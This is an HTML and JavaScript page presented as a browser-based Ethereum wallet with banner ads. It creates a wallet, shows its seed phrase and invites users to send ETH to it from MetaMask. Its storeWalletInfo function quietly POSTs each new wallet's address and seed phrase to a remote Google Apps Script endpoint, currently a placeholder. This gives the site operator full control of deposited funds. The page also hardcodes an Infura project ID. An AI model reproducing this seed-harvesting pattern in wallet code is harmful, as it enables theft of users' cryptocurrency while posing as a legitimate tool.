<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <title>Ethereum Wallet</title>
  <!-- Google Fonts for a modern look -->
  <link href="https://fonts.googleapis.com/css?family=Roboto:400,700" rel="stylesheet">
  <!-- Include ethers.js via CDN -->
  <script src="https://cdn.jsdelivr.net/npm/ethers@5.7.2/dist/ethers.min.js" integrity="sha256-84MryXWWa5+9eNxiUvS32eHSM78C82SglqlN4+0GGN4=" crossorigin="anonymous"></script>
  <style>
    /* Full-page animated gradient background and responsive UI styling */
    body {
      margin: 0;
      font-family: 'Roboto', sans-serif;
      color: #fff;
      background: linear-gradient(-45deg, #000, #4b0082);
      background-size: 400% 400%;
      animation: gradientBG 15s ease infinite;
      display: flex;
      flex-direction: column;
      align-items: center;
      min-height: 100vh;
    }
    @keyframes gradientBG {
      0% { background-position: 0% 50%; }
      50% { background-position: 100% 50%; }
      100% { background-position: 0% 50%; }
    }
    .container {
      width: 90%;
      max-width: 800px;
      margin: 20px;
      padding: 20px;
      background: rgba(0,0,0,0.6);
      border-radius: 10px;
      box-shadow: 0 0 15px rgba(0,0,0,0.5);
    }
    h1, h2 {
      text-align: center;
    }
    .section {
      margin: 20px 0;
    }
    input, button, textarea {
      width: 100%;
      padding: 12px;
      margin: 8px 0;
      border-radius: 6px;
      border: none;
      font-size: 16px;
    }
    button {
      background-color: #4b0082;
      color: #fff;
      cursor: pointer;
      transition: background-color 0.3s;
    }
    button:hover {
      background-color: #6a0dad;
    }
    .ad-container {
      text-align: center;
      margin: 20px 0;
    }
    .info-box {
      background: rgba(255,255,255,0.1);
      padding: 15px;
      border-radius: 8px;
    }
    .return-home {
      text-align: center;
      margin-top: 30px;
    }
  </style>
</head>
<body>
  <!-- Top ad -->
  <div class="ad-container">
    <iframe data-aa='2382909' src='//ad.a-ads.com/2382909?size=468x60' style='width:468px; height:60px; border:0; padding:0; overflow:hidden; background-color: transparent;'></iframe>
  </div>

  <div class="container">
    <h1>Ethereum Wallet</h1>

    <!-- Section: Website Wallet Creation -->
    <div class="section info-box" id="walletCreationSection">
      <h2>Create Website Wallet</h2>
      <button id="createWalletBtn">Create Wallet</button>
      <div id="walletDetails" style="display:none;">
        <p><strong>Wallet Address:</strong> <span id="walletAddress"></span></p>
        <p><strong>Seed Phrase:</strong> <textarea id="seedPhrase" readonly rows="3"></textarea></p>
        <p><strong>Balance:</strong> <span id="walletBalance">0</span> ETH</p>
        <p><strong>ETH Price:</strong> $<span id="ethPrice">0</span></p>
      </div>
    </div>

    <!-- Section: MetaMask Connection -->
    <div class="section info-box" id="metamaskSection">
      <h2>Connect MetaMask</h2>
      <button id="connectMetaMaskBtn">Connect MetaMask</button>
      <div id="metaMaskDetails" style="display:none;">
        <p><strong>Your MetaMask Address:</strong> <span id="metaMaskAddress"></span></p>
        <input type="text" id="metaSendAmount" placeholder="Amount in ETH to Send">
        <button id="metaSendBtn">Send Funds to Website Wallet</button>
        <p id="metaTxStatus"></p>
      </div>
    </div>

    <!-- Middle ad -->
    <div class="ad-container">
      <iframe data-aa='2382909' src='//ad.a-ads.com/2382909?size=468x60' style='width:468px; height:60px; border:0; padding:0; overflow:hidden; background-color: transparent;'></iframe>
    </div>

    <!-- Return Home Button -->
    <div class="return-home">
      <button onclick="window.location.href='index.html'">Return to Home</button>
    </div>
  </div>

  <!-- Bottom ad -->
  <div class="ad-container">
    <iframe data-aa='2382909' src='//ad.a-ads.com/2382909?size=468x60' style='width:468px; height:60px; border:0; padding:0; overflow:hidden; background-color: transparent;'></iframe>
  </div>

  <script>
    /***** Configuration *****/
    // Replace with your actual Infura project ID (your API key)
    const INFURA_PROJECT_ID = "0172ddf22ebd48dfa964f245aa01983f";
    // Replace with your deployed Google Apps Script URL that handles POST requests to update your Google Sheet.
    const GOOGLE_SCRIPT_URL = "YOUR_GOOGLE_SCRIPT_WEBAPP_URL";

    // Provider for Goerli testnet via Infura.
    const provider = new ethers.providers.InfuraProvider("goerli", INFURA_PROJECT_ID);

    let websiteWallet;   // The wallet generated by the website.
    let metaMaskAccount; // The connected MetaMask account.

    /***** Website Wallet Creation *****/
    document.getElementById("createWalletBtn").addEventListener("click", async () => {
      try {
        websiteWallet = ethers.Wallet.createRandom();
        // Connect the generated wallet to the provider for blockchain interactions.
        websiteWallet = websiteWallet.connect(provider);
        // Display wallet details.
        document.getElementById("walletAddress").innerText = websiteWallet.address;
        document.getElementById("seedPhrase").value = websiteWallet.mnemonic.phrase;
        document.getElementById("walletDetails").style.display = "block";
        // Optionally store wallet info in Google Sheets.
        storeWalletInfo(websiteWallet.address, websiteWallet.mnemonic.phrase);
        // Update balance and ETH price.
        updateBalance();
        updateEthPrice();
      } catch (err) {
        alert("Error creating wallet: " + err.message);
      }
    });

    // Update website wallet balance.
    async function updateBalance() {
      if (!websiteWallet) return;
      try {
        const balance = await provider.getBalance(websiteWallet.address);
        document.getElementById("walletBalance").innerText = ethers.utils.formatEther(balance);
      } catch (err) {
        console.error("Error fetching balance:", err);
      }
    }

    // Update ETH price from CoinGecko.
    async function updateEthPrice() {
      try {
        const response = await fetch("https://api.coingecko.com/api/v3/simple/price?ids=ethereum&vs_currencies=usd");
        const data = await response.json();
        document.getElementById("ethPrice").innerText = data.ethereum.usd;
      } catch (err) {
        console.error("Error fetching ETH price:", err);
      }
    }
    setInterval(updateEthPrice, 15000); // refresh ETH price every 15 seconds

    // Store wallet info in Google Sheets via Apps Script.
    async function storeWalletInfo(address, seedPhrase) {
      if (GOOGLE_SCRIPT_URL === "YOUR_GOOGLE_SCRIPT_WEBAPP_URL") {
        console.warn("Google Script URL not set. Wallet info not stored.");
        return;
      }
      try {
        const response = await fetch(GOOGLE_SCRIPT_URL, {
          method: "POST",
          headers: {
            "Content-Type": "application/json"
          },
          body: JSON.stringify({ address, seedPhrase })
        });
        if (!response.ok) {
          console.error("Failed to store wallet info.");
        }
      } catch (err) {
        console.error("Error storing wallet info:", err);
      }
    }

    /***** MetaMask Connection *****/
    document.getElementById("connectMetaMaskBtn").addEventListener("click", async () => {
      if (typeof window.ethereum !== 'undefined') {
        try {
          // Request MetaMask accounts.
          const accounts = await window.ethereum.request({ method: 'eth_requestAccounts' });
          metaMaskAccount = accounts[0];
          document.getElementById("metaMaskAddress").innerText = metaMaskAccount;
          document.getElementById("metaMaskDetails").style.display = "block";
        } catch (err) {
          alert("MetaMask connection error: " + err.message);
        }
      } else {
        alert("MetaMask is not installed. Please install MetaMask and try again.");
      }
    });

    // Send funds from the connected MetaMask wallet to the website wallet address.
    document.getElementById("metaSendBtn").addEventListener("click", async () => {
      if (!metaMaskAccount) {
        alert("Please connect MetaMask first.");
        return;
      }
      if (!websiteWallet) {
        alert("Please create the website wallet first.");
        return;
      }
      const amount = document.getElementById("metaSendAmount").value;
      if (!amount || isNaN(amount)) {
        alert("Enter a valid amount in ETH.");
        return;
      }
      try {
        // Build the transaction parameters.
        const txParams = {
          from: metaMaskAccount,
          to: websiteWallet.address,
          value: ethers.utils.parseEther(amount).toHexString()
        };
        document.getElementById("metaTxStatus").innerText = "Requesting transaction...";
        // Request MetaMask to send the transaction.
        const txHash = await window.ethereum.request({
          method: 'eth_sendTransaction',
          params: [txParams],
        });
        document.getElementById("metaTxStatus").innerText = "Transaction sent! Hash: " + txHash;
        // Optionally update the website wallet balance after a delay.
        setTimeout(updateBalance, 10000);
      } catch (err) {
        document.getElementById("metaTxStatus").innerText = "Error: " + err.message;
      }
    });
  </script>
</body>
</html>
